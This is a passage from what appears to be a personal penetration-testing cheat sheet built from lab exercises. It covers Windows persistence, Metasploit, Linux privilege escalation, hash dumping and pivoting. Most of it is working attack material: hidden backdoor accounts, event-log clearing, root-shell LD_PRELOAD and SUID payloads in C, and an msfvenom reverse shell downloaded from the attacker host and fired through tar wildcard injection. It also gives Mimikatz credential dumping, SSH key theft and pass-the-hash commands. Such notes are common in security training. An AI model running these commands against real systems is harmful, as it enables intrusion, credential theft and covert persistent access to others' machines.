[*] Meterpreter session 2 opened (10.10.26.2:4444 -> 10.5.31.225:49743) at 2024-01-15 17:34:43 +0530  
```
- We can delete the artificats created by metasploit module by Resource Scripts provided by it
    - `resource /root/.msf4/logs/persistence/ATTACKDEFENSE_20240115.3442/ATTACKDEFENSE_20240115.3442.rc`

**Clearing Windows Event Logs usng meterpreter**
- `clearev`

### [Windows Persistence](#)

**Persistence by RDP (GUI based access) or WinRM (CLI based access)**
- Requirements: We need either RDP (3389) or Winrm (5985) port open on target

    - First we create the account itself
        - `net user USERNAME PASSWORD /add`

    - Next we add our newly created account in the "Administrators" and "Remote Management Users" groups
        - `net localgroup Administrators USERNAME /add`
        - `net localgroup "Remote Management Users" USERNAME /add`

    - We can now check user details once

    - we can now winrm or rdp into machine
        - `evil-winrm -i '10.200.141.150' -u 'sam' -p 'Cayde@123'`
        

- Establish Persistence using metasploit module
    - `use exploit/windows/local/persistence_service` > `set payload windows/meterpreter/reverse_tcp` > `set SESSION 1` > `run`
    - Get back access to target by specifying same LHOST and LPORT
        - `use multi/handler` > `set payload windows/meterpreter/reverse_tcp` > `set LHOST 10.10.12.2` > `exploit`

- Establish Persistence by Enabling RDP by metasploit module
    - `use windows/manage/enable_rdp` > ` set SESSION 1` > `exploit`
        - we need to get access to RDP, for wchich we require credentials
            - we can change user password (not recommended)
                - `shell` > `net user Administrator password_123`
                - `xfreerdp /u:administrator /p:password_123 /v:10.5.28.9`
            - we will create a New backdoor user Account and we have the permission to do so as we are administrator, We will then also hider user from windows login screen, we then add the user to gruops Remote Desktop Users and Administrators
                - We can do all of this by a meterpreter command `getgui`
                - `run getgui -e -u user123 -p hacker_123321`


### [Metasploit](#)

- Starting / Troubleshooting DB
    - `sudo service postgresql start`
    - `sudo msfdb init`
    - `sudo msfconsole` > `db_status`
- Brute forcing
    - `use auxiliary/scanner/ssh/ssh_login`
    - `use auxiliary/scanner/smb/smb_login`

- Searching auxiliary/scanner/*
    - `search auxiliary/scanner/ssh`
    - `use auxiliary/scanner/smb/smb_version`
    - `use auxiliary/scanner/smb/smb2`
    - `use auxiliary/scanner/smb/smb_enumusers`
    - `use auxiliary/scanner/smb/smb_enumshares`
    - `use auxiliary/scanner/smb/pipe_auditor`
- Switching shell to meterpreter session
    - `use post/multi/manage/shell_to_meterpreter`
    - `sessions -u 1`

- Post Exploit Enumeration
    - `sysinfo`
    - `getuid`



### [Linux Post Exploit Enumeration](#)

**Break out of Jail shell first**
    - `/bin/bash -i`
    - `echo os.system('/bin/bash')`
    - `python -c 'import pty;pty.spwan("/bin/bash")`
**Operating System Enumeration**

- Kernel version and System architecture
    - `unmae -r`, `uname -a`
    - `cat /proc/version`
        - Check if kernel exploit exist
- Linux Distribution type and its version
    - `cat /etc/issue`

**Users and Permissions Enumeration**

- Users looged in, Users last logged in
    - `id`, `who`, `whoami`, `w`, `last`
- History of user activity
    - `cat ~/.bash_history`
- List of users
    - `cat /etc/passwd`
- Sudo permissions, 
    - `sudo -l`
        - check each binary properly
- Permissions for sensetive files
    - `cat /etc/sudoers`
    - `cat /etc/shadow`
        - check if you have write access
- Interesting files in home directories if any
    - `ls -ahlR /home`
- Permission for sensetive directories
    - `ls -ahlR /root/`
- Writable directories for user
    - `find / -type d -writable 2>/dev/null` / `find / -type d -perm -222 2>/dev/null` / `find / -perm -o+w -type d 2>/dev/null `
        - this can be used to keep our payloads
- Writable files for user
    - `find / -perm -o+w -type f -ls 2>/dev/null`
- Writable Config files in /etc 
    - `find / -perm -o+w -type f -ls 2>/dev/null | grep /etc`
- Checking Environmental variables
    - `echo $PATH`
        - Check if there is writable folder in PATH
- SUID / GUID permission files
    - `find / -type f -perm -04000 -ls 2>/dev/null` / `find / -type f -perm -u=s -ls 2>/dev/null`
    - `find / -type f -perm -02000 -ls 2>/dev/null` / `find / -type f -perm -g=s -ls 2>/dev/null`
- 


**Information Enumeration**

- Ways to upload file

    - `find / -name wget  2>/dev/null `
    - `find / -name netcat  2>/dev/null `
    - `find / -name nc  2>/dev/null `
    - `find / -name ftp 2>/dev/null`

- SSH private and public key hunting

    - `ls -la /home /root /etc/ssh /home/*/.ssh/`
    - `find / -name authorized_keys 2> /dev/null`
    - `locate id_rsa` / `locate id_dsa` / `find / -name id_rsa 2> /dev/null` / `find / -name id_dsa 2> /dev/null`
    - `cat /home/*/.ssh/id_rsa` / `cat /home/*/.ssh/id_dsa`
    - `cat /etc/ssh/ssh_config` / `cat /etc/sshd/sshd_config`
    - `cat ~/.ssh/authorized_keys` / `cat ~/.ssh/identity.pub` / `cat ~/.ssh/identity` / `cat ~/.ssh/id_rsa.pub` / `cat ~/.ssh/id_rsa` / `cat ~/.ssh/id_dsa.pub` / `cat ~/.ssh/id_dsa`

- Any settings/files (hidden) on website, Any settings file with database information

    - `ls -alhR /var/www/` / `ls -alhR /srv/www/htdocs/` / `ls -alhR /usr/local/www/apache22/data/` / `ls -alhR /opt/lampp/htdocs/` / `ls -alhR /var/www/html/`
- Checking logs file in directories

    - `/etc/httpd/logs`
    - `/var/log/`

- Development tools/languages are installed/supported

    - `cat /proc/version` (tellls us if `gcc` is installed)
    - `find / -name python 2>/dev/null`
    - `find / -name perl 2>/dev/null`

**Serivces Enumeration**

- Services Running and their Privileges
    - `ps`, `ps aux`, `ps aux | grep root`
        - check which services are running by root, and which are vulnerable

**Cron Jobs Enumeration**

- Checking system-wide cron jobs    
    - `crontab -l`
    - `cat /etc/crontab`
        - check cron jobs of root user, analyse content of file assosiated

**File System Enumeration**

- How are files system mounted
    - `mount`, `df -h`
- Are there any unmounted file-systems
    - `cat /etc/fstab`

**DNS Server Enumeration**

- Checking DNS server's used
    - (miscondifured DNS server may be vulnerble to `DNS Zone Transfer attacks`)
    - `/etc/resolve.conf`

### [Linux Privilege Escalation](#)

**Privilege Escalation by Kernel Exploits**

- Linux Exploit Suggestor
    - `/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh`
        - suggested dirtycow exploit, downloaded and used
    - `mv 40839.c dirtcowexploit.c` >`python -m http.server 80` > `wget http://10.17.107.227/dirtcowexploit.c -P /tmp/` > `cd /tmp` > `gcc dirtcowexploit.c -pthread -o dirty -lcrypt` > `./dirty` > `su firefart`

- Exploit DB
    - `mv 37292.c exploit.c` > `python -m http.server 80`  > `wget http://10.17.107.227/exploit.c -P /tmp/` > `cd tmp` > `gcc exploit.c -o exploit` > `./exploit`

**Privilege Escalation by SUDO Permissions**

- Privilege Escalation by SUDO (Shell Escaping)
    - `sudo man ls` > `!/bin/bash`
    - `sudo nano /etc/sudoers` > `karen ALL=NOPASSWD:ALL` > `sudo su`
    - `sudo nano` > `Ctrl+R then Ctrl+X,` > `sh 1>&0 2>&0`
    - `sudo find . -exec /bin/sh \; -quit`
    - `sudo awk 'BEGIN {system("/bin/sh")}'`
    - `sudo vim -c '!sh'`
    - `echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse`
    - `sudo apache2 -f /etc/shadow`
- Privilege Escalation by SUDO (Shared object Injection through env variable `LD_PRELOAD` and `LD_LIBRARY_PATH`)
    - `nano exploit.c`
        ```
        #include <stdio.h>
        #include <stdlib.h>
        #include <sys/types.h>
        void _init() {
            unsetenv("LD_PRELOAD");
            setuid(0);
            setgid(0);
            system("/bin/bash -p");
            }   
        ```
        -  `gcc -fPIC -shared -nostartfiles -o ./libncursesw.so.6 ./exploit.c` > `sudo LD_PRELOAD=./libncursesw.so.6 nano`

    - `nano /tmp/preload.c`
        ```
        #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>

        void _init() {
                unsetenv("LD_PRELOAD");
                setresuid(0,0,0);
                system("/bin/bash -p");
        }

        ```
        - `gcc -shared -fPIC -nostartfiles -o /tmp/preload.so /tmp/preload.c` > `sudo LD_PRELOAD=/tmp/preload.so /usr/sbin/apache2`

    - `ldd /usr/sbin/apache2` > `nano /home/user/tools/sudo/library_path.c`
        ```
        #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>

        void _init() {
                unsetenv("LD_LIBRARY_PATH");
                setresuid(0,0,0);
                system("/bin/bash -p");
        }
        ```
        - `gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c` > `sudo LD_LIBRARY_PATH=/tmp apache2`

**Privilege Escalation by SUID Permissions**

- Privilege Escalation by - SUID (Abusing intented binary functionality using `GTFOBins`)

    - `find / -type f -perm -04000 -ls 2>/dev/null` > `base64 /etc/shadow | base64 --decode` > `base64 /etc/passwd | base64 --decode` > `unshadow passwd.txt shadow.txt > crackme.txt` > `john --wordlist=/home/kali/rockyou.txt crackme.txt `

- Privilege Escalation by - SUID (`Shared Object Injection`)

    - `find /home -user root -perm -4000 -exec ls -la {} \;`
        ```
        -rwsr-xr-x 1 root root 8344 Sep 22  2018 /home/student/welcome
        ```
        - `strings welcome` 
        ```
        /lib64/ld-linux-x86-64.so.2
        libc.so.6
        setuid
        system
        __cxa_finalize
        __libc_start_main   
        greetings
        ;*3$"
        GCC: (Ubuntu 7.3.0-16ubuntu3) 7.3.0
        crtstuff.c
        ```
        - `rm greetings` > `cp /bin/bash greetings` > `./welcome`

    - `find / -type f -perm -04000 -ls 2>/dev/null` > `strings /usr/local/bin/suid-so`
        ```
        /lib64/ld-linux-x86-64.so.2
        #eGVO
        CyIk
        libdl.so.2
        Calculating something, please wait...
        /home/user/.config/libcalc.so
        Done.
        Y@-C
        ```
        - `ls /home/user/.config`
        ```
        ls: cannot access /home/user/.config: No such file or directory
        ```
        - `nano  /home/user/.config/libcalc.c` 
        ```
        #include <stdio.h>
        #include <stdlib.h>

        static void inject() __attribute__((constructor));

        void inject() {
            system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
        }
        ```
        -  `/usr/local/bin/suid-so`

    
- Privilege Escalation by - SUID (Binary Symlinks) / Nginx vulnerability / CVE-2016-1247

    - `dpkg -l | grep nginx` 
        ```
        ii  nginx-common                        1.6.2-5+deb8u2~bpo70+1       small, powerful, scalable web/proxy server - common files
        ii  nginx-full                          1.6.2-5+deb8u2~bpo70+1       nginx web/proxy server (standard version)
        ```
            - for this exploit you should be `www-data` user
        - `/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log`

- Privilege Escalation by - SUID (Known Exploits)

    -  `find / -type f -perm -04000 -ls 2>/dev/null` > `/home/user/tools/suid/exim/cve-2016-1531.sh`

- Privilege Escalation by - SUID (Enviornment Variables)

    - `find / -type f -perm -04000 -ls 2>/dev/null` > `strings /usr/local/bin/suid-env`
        ```
        /lib64/ld-linux-x86-64.so.2
        5q;Xq
        __gmon_start__
        libc.so.6
        setresgid
        setresuid
        system
        __libc_start_main
        GLIBC_2.2.5
        fff.
        fffff.
        l$ L
        t$(L
        |$0H
        service apache2 start
        ```
        - `/usr/local/bin/suid-env` > 
        ```
        sh: service: command not found
        ```
        - `echo $PATH` > `export PATH=/tmp:$PATH` > `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c` > `gcc /tmp/service.c -o /tmp/service` > `/usr/local/bin/suid-env`

- Privilege Escalation by - SUID (`Abusing Shell Features`)

    - `find / -type f -perm -04000 -ls 2>/dev/null` > `strings /usr/local/bin/suid-env2`
        ```
        /lib64/ld-linux-x86-64.so.2
        __gmon_start__
        libc.so.6
        setresgid
        setresuid
        system
        __libc_start_main
        GLIBC_2.2.5
        fff.
        fffff.
        l$ L
        t$(L
        |$0H
        /usr/sbin/service apache2 start  
        ```
        - `/bin/bash --version`
        ```
        GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
        Copyright (C) 2009 Free Software Foundation, Inc.
        License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
        ```
        - `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }` > `export -f /usr/sbin/service` > `/usr/local/bin/suid-env2`

**Privilege Escalation by Cron Jobs**

- Privilege Escalation - Cron (abusing cron job created by root user if found)

    - `ls -al`
        - found a file message with permission -rw-------
    - `cat message`
        - permission denied
        - checking if path of this file used anywhere
    - `grep -rnw /usr -e "/home/student/message"`
        ```
        /usr/local/share/copy.sh:2:cp /home/student/message /tmp/message
        ```
        - found it in copy.sh sexond line, its copying itself into /tmp/message
    - `ls -al /usr/local/share/copy.sh`
        ```
        -rwxrwxrwx 1 root root 74 Sep 23  2018 /usr/local/share/copy.sh
        ```
    - `cat /usr/local/share/copy.sh`
        ```
        #! /bin/bash
        cp /home/student/message /tmp/message
        chmod 644 /tmp/message
        ```
    - `printf '#!bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh`
        - we addedd permission for student in sudoers
        - once cron job is run we can sudo and get root
    - `sudo su`

- Privilege Escalation  - Cron (Utilising writable foleder in `PATH` variable)
    - `cat /etc/crontab`
        ```
        PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

        # m h dom mon dow user  command
        17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
        25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
        47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
        52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
        #
        * * * * * root overwrite.sh
        * * * * * root /usr/local/bin/compress.sh
        ```
        -  `echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >/home/user/overwrite.sh` > `chmod +x /home/user/overwrite.sh` > `/tmp/bash -p`

- Privilege Escalation  - Cron (File Overwrite)

    - `cat /etc/crontab`
        ```
        # m h dom mon dow user  command
        17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
        25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
        47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
        52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
        #
        * * * * * root overwrite.sh
        * * * * * root /usr/local/bin/compress.sh
        ```
        - `cat /usr/local/bin/compress.sh`
        ```
        #!/bin/sh
        cd /home/user
        tar czf /tmp/backup.tar.gz *
        ```
        - `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh` > `/tmp/bash -p`

- Privilege Escalation  - Cron (Wildcard)

    - `cat /etc/crontab` > `cat /usr/local/bin/compress.sh`
        ```
        #!/bin/sh
        cd /home/user
        tar czf /tmp/backup.tar.gz *
        ```
        - `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.17.107.227 LPORT=4444 -f elf -o reverseshell.elf` > `python -m http.server 80`
        - `wget http://10.17.107.227/reverseshell.elf -P /tmp/` > `mv /tmp/reverseshell.elf /home/user/`
        - `touch /home/user/--checkpoint=1`
        - `touch /home/user/--checkpoint-action=exec=reverseshell.elf`
        - Now we can listen on our machine, when cron job would run we get root
        - `nc -nlvp 4444`

**Privilege Escalation by Exploiting SSH Keys or Password in config files**

- Public and private keys are generally stored in one of the following locations:
    - `/root/.ssh/`
    - `/home/user_name/.ssh/` (users home directory)
    - `/etc/ssh/`
    - In the paths specified in the `/etc/ssh/ssh_config` or `/etc/ssh/sshd_config` config files

- Two ways to exploit

    - `Accessing readable private SSH keys and using them to authenticate`
        - find private key
        - copy the conetent of it or else get it transfered ot our attacker machine
        - create a file and copy the contetnt in it
        - it needs to be only readable and writable only by its owner
            - `chmod 600 key_name`
        - finally login as the that user
            - `ssh -i key_name user_name@X.X.X.X`

    - `Accessing writable public SSH keys and adding your own one to them to authenticate`
        - The `authorized_keys` file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. 
        - So If the authorized_keys file is writable `rwxrwxrwx` to the current user, `this can be exploited by adding additional authorized keys.`
        - So We simply need to generate new public and private key pair, then copy the public key into server's `authorised keys` file
            - In case we already have ssh access we can simply do by using `ssh-copy-id`
                - `ssh-copy-id user_name@X.X.X.X`
            - or we can also simply by using cat to output the contents of the id_rsa.pub file and redirect it to the authorized_keys file
                - `cat ~/.ssh/id_rsa.pub | ssh user_name@X.X.X.X "cat >> /home/user_name/.ssh/authorized_keys"`

- The following command can be used to identify any existing public or private keys and their permissions:
    - `ls -la /home /root /etc/ssh /home/*/.ssh/`
    - `find / -name authorized_keys 2> /dev/null`
    - `locate id_rsa` / `locate id_dsa` / `find / -name id_rsa 2> /dev/null` / `find / -name id_dsa 2> /dev/null`
    - `cat /home/*/.ssh/id_rsa` / `cat /home/*/.ssh/id_dsa`
    - `cat /etc/ssh/ssh_config` / `cat /etc/sshd/sshd_config`
    - `cat ~/.ssh/authorized_keys` / `cat ~/.ssh/identity.pub` / `cat ~/.ssh/identity` / `cat ~/.ssh/id_rsa.pub` / `cat ~/.ssh/id_rsa` / `cat ~/.ssh/id_dsa.pub` / `cat ~/.ssh/id_dsa`

**Privilege Escalation by Misconfigured NFS (Network File Sharing)**

- check for `“no_root_squash” ` in `/etc/exports` file

    ```
    karen@ip-10-10-17-59:/$ `cat /etc/exports`

    # /etc/exports: the access control list for filesystems which may be exported
    #               to NFS clients.  See exports(5).
    #
    # Example for NFSv2 and NFSv3:
    # /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
    #
    # Example for NFSv4:
    # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
    # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
    #
    /home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
    /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
    /home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
    ```
- If the `“no_root_squash”` option is present on a writable share, we can create an executable with SUID bit set and run it on the target system

    - Enumerate mountable shares from our attacking machine.
        - `showmount -e 10.10.17.59`

    - we can mount above shares, we are interested in `no_root_sqash` so will mount /home/backup
     - `mkdir /tmp/targetsharebackup` > `mount -o rw 10.10.17.59:/home/backup /tmp/targetsharebackup `

    - Now since As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.
     - `cd /tmp/targetsharebackup` 

        ```
        ┌──(root㉿kali)-[/tmp/targetsharebackup]
        └─# `nano nfc.c`  

        #include<unistd.h>
        void main (){
        setuid(0);
        setgid(0);
        system("/bin/bash");
        }
        ```
    - Complie the code to create executable and give SUID permission
     - `gcc nfc.c -o nfs` > `chmod u+s nfs`
            
    - get back to Target machine You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them).

    - run the binary and get Root access
        - ``./home/backup/nfs`` > `id`

**Privilege Escalation by PATH writable folder**

Conditions Required
    - There should be a file wih SUID permission created by root user.
    - This file should be executing some other file of which absolute path is not mentioned , therfore it will look for PATH vairable for this file
        ```
        ┌──(root㉿kali)-[/home/kali/Desktop]
        └─# `cat testelf_code.c` 
        #include<unistd.h>
        void main (){
        setuid(0);
        setgid(0);
        system("thm");
        }
        ```
    - you should have write privileges to folder in PATH
    - you can then create `thm` file in that folder  put malicious code in it
    ```
    ┌──(user㉿kali)-[/tmp]
    └─$ `echo "/bin/bash" > thm`
    ```
    - you can then give it rwx permission
        - ``chmod 777 thm``
    - further you can execute the SUID binary and get root access
        - ``./testelf` > `id`


### [Encryption, (Hash Identification, Generation,  Dumping) and Password Cracking](#)

**Encryption**

- GNU Privacy Guard (GPG or gpg)
    - Encrypting (need to give password in prompt)- `gpg -c file1.txt `
    - Hiding/renaming - ` mv file1.txt.gpg critical_data.doc`
    - Decrypting (using password in prompt)- `gpg -d critical_data.doc `
    - Decrypting without password
        - Bruteforce using John
            - Convert encryted file to hash
                - `gpg2john [encrypted gpg file] > [filename of the hash you want to create]`
            - Brute force using John
                - `john wordlist=[location/name of wordlist] --format=gpg [name of hash we just created]`


- OpenSSL
    - Encrypt file
        - `openssl aes-256-cbc -e -in message.txt -out encrypted_message`
    - Decrypt file
        - `openssl aes-256-cbc -d -in encrypted_message -out original_message.txt`
    - Encryption more secure and resilient against brute-force attacks
        - use the Password-Based Key Derivation Function 2 (PBKDF2)
            - `openssl aes-256-cbc -pbkdf2 -iter 10000 -e -in message.txt -out encrypted_message`
        - Decryption 
            - `openssl aes-256-cbc -pbkdf2 -iter 10000 -d -in encrypted_message -out original_message.txt`

**Hash Identification**

- Linux hashes in /etc/passwd based on diffrent crypt schemes

    - Traditional DES based scheme (Default Password Encryption algorithm)
        - `Kyq4bCxAXJkbg`

    - BSDI extended DES Scheme
        - `_EQ0.jzhSVeUyoSqLupI`

    - MD5-based scheme
        - `$1$etNnh7FA$OlM7eljE/B7F1J4XYNnk81`

    - Bcrypt - Blowfish-based scheme
        - Hashes starts with `$2$, $2a$, $2b$, $2x$ or $2y$ `depending on which variant of the algorithm is used
            - Example - `$2a$10$VIhIOofSMqgdGlL4wzE//e.77dAQGqntF/1dT7bqCrVtquInWy2qi`

    - NT Hash based scheme
        - `$3$$8846f7eaee8fb117ad06bdd830b7586c`

    - SHAcrypt - SHA-2 (SHA-256 and SHA-512) based schem
        - H ashes starts with `$5$ (for SHA-256) or $6$ (for SHA-512)` depending on which SHA variant is used
            - SHA-256 - `$5$9ks3nNEqv31FX.F$gdEoLFsCRsn/WRN3wxUnzfeZLoooVlzeF4WjLomTRFD`
            - SHA-512 - `$6$qoE2letU$wWPRl.PVczjzeMVgjiA8LLy2nOyZbf7Amj3qLIL978o18gbMySdKZ7uepq9tmMQXxyTIrS12Pln.2Q/6Xscao0`

    - Scrypt - Password Based Key Derivate Function (PBKFD) based scheme
        - `$7$DU..../....2Q9obwLhin8qvQl6sisAO/$sHayJj/JBdcuD4lJ1AxiwCo9e5XSi8TcINcmyID12i8`

    - Scrypt+SHA256 based scheme
        - `$8$mTj4RZG8N9ZDOk$elY/asfm8kD3iDmkBe3hD2r4xcA/0oWS5V3os.O91u.`

    - Yescrypt
        - `$y$j9T$F5Jx5fExrKuPp53xLKQ..1$X3DX6M94c7o.9agCG9G317fhZg9SqC.5i5rd.RhAtQ7`

- Windows NTLM hash
    - `Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::`
    - It is combination of NT and LM hash, LM hash is same for all users on system
        - NT Hash - `e3c61a68f1b89ee6c8ba9507378dc88d`
        - LM Hash - `aad3b435b51404eeaad3b435b51404ee`

#### Linux hashed password generation

- OpenSSL
    ```
    student@attackdefense:~$ `openssl passwd -1 -salt abc password123`
    $1$abc$UWUoROXzUCsLsVzI0R2et.
    ```
- mkpasswd
    ```
    ┌──(kali㉿kali)-[~]
    └─$ `mkpasswd -m sha-512 newpasswordhere`
    $6$oTvKrJiKZIcu/MLj$q8t7Ip.Plc4rfdRjyUlL9bEx2loeDcROEHph.syr/7.56YGKAPUMNkMQpavEbGo7T3nt/XXZDsuAiz7DlVFpQ.
    ```

#### Hash Dumping

##### Windows
###### Metasploit 
- Using inbuilt meterpreter extension `Kiwi`
    - Migrating to `LSASS` process
        - `pgrep lsass` > `migrate 788`
    - load and run kiwi
        - `load kiwi` > `creds_all` > `lsa_dump_sam`

- Dumping hashes using meterpreter `hashdump`
    - `hashdump`

###### Mimikatz

- Uploading and using Mimikatz executable with meterpreter
    - Migrating to `LSASS` process
        - `pgrep lsass` > `migrate 788`
    - Upload mimikatz executable
        - `mkdir temp` > `cd temp` > `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
    - Run mimikatxz executable
        - ` shell` > `.\mimikatz.exe ` 
        - Confirm that you have elevated privileges that mimikatz requires and elevate our integrity to SYSTEM level.
            - `privilege::debug` > `token::elevate`
        - Dump the SAM database hashes
            - `lsadump::sam`

- Using Mimikatz executable
    - Upload executable using suitable technique
    - Run executabel and check for provileges for '20' OK
        - `mimikatz.exe` > `privilege::debug `
    - Possible attacks
        - Dump Logonpaswords of users stored in memeory of users logged in after last boot
            - mimikatz # `sekurlsa::logonpasswords `
        - Dump SAM which includes hashes of all users
            - mimikatz # `lsadump::sam `
            - mimikatz # `lsadump::sam /patch `
        - Dump hashes of users from LSA
            - mimikatz # `lsadump::lsa /patch `
        - Dump password hashes from the NTDS.DIT file without need to authenticating domain controller
            - mimikatz # `lsadump::dcsync /domain:controller.local /all /csv`

###### Secretsdump.py

##### Linux
- Manually - `cat /etc/shadow`
- Metasploit -  `post/linux/gather/hashdump`

#### Password Cracking


- Unshadow
    - `unshadow passwd.txt shadow.txt > crackme.txt`

- John
    - `john --wordlist=/home/kali/rockyou.txt crackme.txt `
    - `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
    - `john --wordlist=rockyou.txt hash.txt`

- Hashcat
    - `hashcat -m 0 -a 0 md5.txt rockyou.txt`

### [Windows Alternate Authentication (NTLM and Kerberos)](#)
By alternate authentication material, we refer to any piece of data that can be used to access a Windows account without actually knowing a user's password itself. This is possible because of how some authentication protocols used by Windows networks work.
alternatives available for NTLM and Kerberos auth are as follows.

#### Pass The Hash 
- NOTE - Pass the hash can only be done for NTLM hash, its not possible for NTLMv2 or Net-NTLM
###### PsExec

- Pass The Hash Attack using `PsExec` module of metasploit
    - Get the hash (both NTLM and LM hash required)
        - `hasdump` / `kiwi`/ Mimikatz executable
    - Use module
        - `use exploit/windows/smb/psexec ` > `set LPORT 1234` > `set RHOSTS 10.5.20.134` > `set SMBuser Administrator` > `set SMBPASS aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d` > `exploit`
    - Using python version of PsExec
        - `psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP`

###### RDP

- Get NTLM hash and use it to rdp
    - `xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH`

###### WinRM
- Syntex
    - `evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH`
- example 
    - `evil-winrm -u Administrator -H '37db630168e5f82aafa8461e05c6bbd1' -i 10.200.141.150`

###### crackmapexec
- Pass The Hash using `crackmapexec`
    - Get the hash (only NTLM hash is required)
        - `hasdump` / `kiwi`/ Mimikatz executable
    - Use tool
        - `crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d`
        - Remote code execution using crackmapexec
            - `crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d -x "ipconfig"`

#### Pass The Ticket



### [Pivoting](#)

#### Hosts Discovery

1. ARP cache
    - `arp -a`

2. Hosts file
    - `/etc/hosts`
    - `C:\Windows\System32\drivers\etc\hosts`

3. Ping Sweep

    - Linux
        - `for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done`
    - Windows
        - `for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up`

4. Using Static Binary

    - Static Nmap binary
        - https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
    - Transfer file to compromised machine
        - ``python -m http.server 80``> ``curl -O http://10.50.138.14/nmap`
    - provide the execute permission and run
        - `chmod +x nmap` > `./nmap 10.200.141.0/24 -sn`


#### Port Scanning

1. Bash onliner
    - `for i in {1..15000}; do (echo > /dev/tcp/10.200.141.200/$i) >/dev/null 2>&1 && echo $i is open; done`

2. Using Static Binary
    - `./nmap 10.200.141.100 10.200.141.150`

3. Using script from `PowerSploit` called `Portscan.ps1`
    - below is example of script uploaded using winrm
        - `evil-winrm -u Administrator -H '37db630168e5f82aafa8461e05c6bbd1' -i 10.200.141.150 -s /usr/share/windows-resources/powersploit/Recon/`
        - *Evil-WinRM* PS C:\Users\Administrator\Documents> `Invoke-Portscan.ps1` 
        - *Evil-WinRM* PS C:\Users\Administrator\Documents> `Invoke-Portscan -Hosts 10.200.141.100 -TopPorts 50 -T 4 -oA PersonalPC`
    
#### Proxying and Port Forwarding

###### SSH Tunnel (SOCKS Proxy and Port Forwarding)

- Requirements
    - For Local Port Forwarding
        - Can be done from our attacking box when we have SSH access to the target, then you can connecy to SSH server of compromised machine from SSH client of your attacking machine.
    - For Remote Port Forward
        - Preferable if you have a shell on the compromised server, but not the SSH access, then you can use SSH client and connect to SSH server of your attacking machine
        
- Local SSH Tunnel Port Forwarding / Foward Port Forwarding
    - From Attacker Machine (ssh client) to Comproised machine (ssh server) for target machine
        - `ssh -i ssh_key root@10.200.141.200 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -L 9999:10.200.141.150:80 -fN`

- Remote SSH Tunnel Port Forwarding / Reverse Port Forwarding
    - From Compromised machine (ssh client) to attacker machine (ssh server) for target machine
        - `ssh kali@172.16.0.20 -i KEYFILE -R 8000:172.16.0.10:80 -fN`

- SOCKS proxy 
    - From Attacker machine to Compromised Machine for target machine
        - `ssh -i ssh_key root@10.200.141.200 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -D 1337 -C -N `

        - Example use
            - `curl --socks5 localhost:1337 http://10.200.141.150`
        
        - Use with Proxychains
            - `nano /etc/proxychains.conf` > `socks4  127.0.0.1 1337`
            - `proxychains curl http://10.200.141.150`


###### Chisel (SOCKS Proxy and Port Forwarding)

- Requirements
    - Chilsel Windows / Linux binary 
        - https://github.com/jpillora/chisel/releases

- Local Port Forwarding / Forward Port Forwarding
    - From Attacker Machine (chisel client) to Comproised machine (chisel server) for target machine
        - On the compromised target
            - If its windows machine we first need to open a port using `netsh` so that firewall dosen't block our connection
                - - `netsh advfirewall firewall add rule name="chisel-sam" dir=in action=allow protocol=tcp localport=8000`
                - Now start a chisel server in this port

